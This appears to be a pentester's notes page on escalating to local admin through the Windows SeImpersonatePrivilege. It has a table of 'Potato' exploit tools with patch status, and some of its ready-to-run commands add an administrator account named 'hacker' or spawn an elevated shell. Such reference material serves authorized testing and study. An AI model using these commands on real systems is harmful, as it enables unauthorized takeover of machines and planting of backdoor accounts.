---
title: SeImpersonatePrivilege
---

This [[notes/windows/privilege]] allows to impersonate any token for which you can get handle and can be leveraged to become to local admin.

# Tools

Name | Release | Compatibility
-----|---------|--------------
[EfsPotato](https://github.com/daem0nc0re/PrivFu/tree/main/ArtsOfGetSystem#efspotato) | 10.23. | Windows 11 22H2 via `\pipe\efsrpc`, unpatched ([source](http://web.archive.org/web/20231010120914/https://blog.hackvens.fr/articles/CoercedPotato.html), [source](https://twitter.com/daem0nc0re/status/1714613181191221743))
[CoercedPotato](https://github.com/hackvens/CoercedPotato) | 10.23. | Windows 10 - 11, Windows Server 2022, unpatched, tests multiple techniques ([source](http://web.archive.org/web/20231010120914/https://blog.hackvens.fr/articles/CoercedPotato.html))
[GodPotato](https://github.com/BeichenDream/GodPotato) | 04.23. | Windows Server 2012 - 2022, unpatched
[LocalPotato](https://github.com/decoder-it/LocalPotato) | 02.23. | Windows 10 - 11 | patched January 2023, but relay to local WebDAV won't be fixed ([source](https://twitter.com/decoder_it/status/1652309476530085889))
[RasmanPotato](https://github.com/crisprss/RasmanPotato) | 02.23. | Windows 10, Windows Server 2012 - 2019, unpatched
[McpManagementPotato](https://github.com/zcgonvh/DCOMPotato) | 12.22. | Windows 10 21H2 confiremd, unknown ([source](https://twitter.com/secu_x11/status/1675481117384646656))
[PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato) | 12.22. | Windows 10 - 11, Windows Server 2012 - 2022, unpatched
[JuicyPotatoNG](https://github.com/antoniococo/juicypotatong) | 10.22. | Windows 10 - 11 22H2, up to Windows Server 2022, default CLSID patched on Windows 11 22H2 ([source](https://github.com/antonioCoco/JuicyPotatoNG/issues/4)), but `{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}` still works on 22H2 ([source](http://web.archive.org/web/20231104184420/https://raw.githubusercontent.com/antonioCoco/infosec-talks/main/10_years_of_Windows_Privilege_Escalation_with_Potatoes.pdf))
[DiagTrackEoP](https://github.com/wh04m1001/diagtrackeop) | 07.22. | at least Windows Server 2019
[SweetPotato](https://github.com/CCob/SweetPotato) | 05.22. | implements RottenPotato, RogueWinRM, JuciyPotato, PrintSpoofer and EfsPotato, Windows Server 2008 to 2019
[EfsPotato](https://github.com/zcgonvh/EfsPotato) | 11.21. | unknown
[RemotePotato0](https://github.com/antonioCoco/RemotePotato0) | 08.21. | patched since October 2022 ([source](https://twitter.com/splinter_code/status/1583555613950255104))
[Gotato](https://github.com/iammaguire/Gotato) | 07.21. | GenericPotato in Go
[GenericPotato](https://github.com/micahvandeusen/GenericPotato) | 04.21. | creates HTTP or named pipe listener and impersonates users that connect, requires separate trigger
[JuicyPotato](https://github.com/ohpe/juicy-potato) | 03.21. | improved RottenPotatoNG, up to Windows Server 2016, patched since Windows 10 1809 and Windows Server 2019
[RoguePotato](https://github.com/antoniococo/roguepotato) | 05.20. | at least up to Windows Server 2019
[PrintSpoofer.NET](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET) | 03.21. | variant that does not require interactive logon
[PrintSpoofer](https://github.com/itm4n/printspoofer) | 05.20. | at least up to Windows Server 2019, unpatched
[RogueWinRM](https://github.com/antonioCoco/RogueWinRM) | 02.20. | patched on Windows 11 22H2 ([source](https://twitter.com/decoder_it/status/1616515769088737280))
[GhostPotato](https://github.com/Ridter/GhostPotato) | 11.19. | patched since 2019
[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) | 12.17. | improved RottenPotato
[RottenPotato](https://github.com/foxglovesec/RottenPotato) | 12.17. | patched since Windows 10 1809 and Windows Server 2019
[HotPotato](https://github.com/foxglovesec/Potato) | 02.16. | patched since 2016

GodPotato on Windows Server 2019.

~~~ bat
.\GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
~~~

JuicyPotatoNG on Windows Server 2022.
On Windows 11 and Windows Server 2022 use class id `A9819296-E5B3-4E67-8226-5E72CE9E1FB7` ([source](http://web.archive.org/web/20221023144236/https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)).

~~~ bat
.\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "/c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
~~~

PrintSpoofer on Windows Server 2019.

~~~ bat
.\PrintSpoofer.exe -c powershell.exe -i
~~~

JuicyPotato on Windows Server 2016.
Try [different CLSIDs](https://github.com/ohpe/juicy-potato/tree/master/CLSID/).

~~~ bat
.\JuicyPotato.exe -l 6666 -p %TEMP%\shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
~~~

References:

- [Exploring Impersonation through the Named Pipe Filesystem Driver](http://web.archive.org/web/20230504073128/https://scribe.rip/@specterops/exploring-impersonation-through-the-named-pipe-filesystem-driver-15f324dfbaf2)
- [In the Potato family, I want them all](http://web.archive.org/web/20230224075943/https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
- [Giving JuicyPotato a second chance: JuicyPotatoNG](http://web.archive.org/web/20220922132749/https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [Windows privilege escalation with potatoes](http://web.archive.org/web/20221020142112/https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
